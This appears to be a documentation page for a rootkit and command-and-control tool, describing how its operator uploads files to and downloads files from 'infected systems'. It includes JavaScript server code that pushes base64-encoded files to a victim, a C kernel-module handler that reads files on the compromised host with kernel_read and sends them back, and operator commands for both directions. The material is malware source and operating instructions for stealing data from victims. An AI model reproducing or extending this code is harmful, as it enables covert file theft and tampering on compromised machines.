---
title: "File Transfer"
description: "Upload and download files between C2 server and infected systems"
icon: "file_copy"
date: "2025-05-30T00:00:00+01:00"
lastmod: "2025-05-30T00:00:00+01:00"
draft: false
toc: true
weight: 517
---

# File Transfer

Bidirectional file transfer between C2 server and infected systems using base64 encoding.

## Implementation

### Upload to Target
```javascript
// Server side (attacking_program)
function uploadFile(clientId, localPath, remotePath) {
    const fileBuffer = fs.readFileSync(localPath);
    const base64Content = fileBuffer.toString('base64');
    
    return sendCommand(clientId, 'UPLOAD', {
        filename: remotePath,
        content: base64Content,
        encoding: 'base64'
    });
}
```

### Download from Target
```c
// Rootkit side (file_commands.c)
int handle_download(const char *data)
{
    file = filp_open(filepath, O_RDONLY, 0);
    bytes_read = kernel_read(file, file_buffer, file_size, &pos);
    
    // Base64 encode and send
    base64_encode(file_buffer, file_size, encoded_buffer, &encoded_size);
    return send_result(encoded_buffer);
}
```

Files are encoded in base64 for JSON protocol compatibility.

## Usage

### WebUI
**[File Manager Panel](../../04-web-ui/features/panels/file-manager-panel.md)** provides:
- File browser with upload/download
- Drag-and-drop upload interface
- Progress indicators

### C2 Commands
```bash
# Upload file to target
upload Client-1 /local/path/file.txt /remote/path/file.txt

# Download file from target  
download Client-1 /remote/path/config.conf
```

## Storage

- **Uploads**: Stored in target filesystem at specified path
- **Downloads**: Saved to `attacking_program/downloads/` directory

Files retain permissions and timestamps where possible.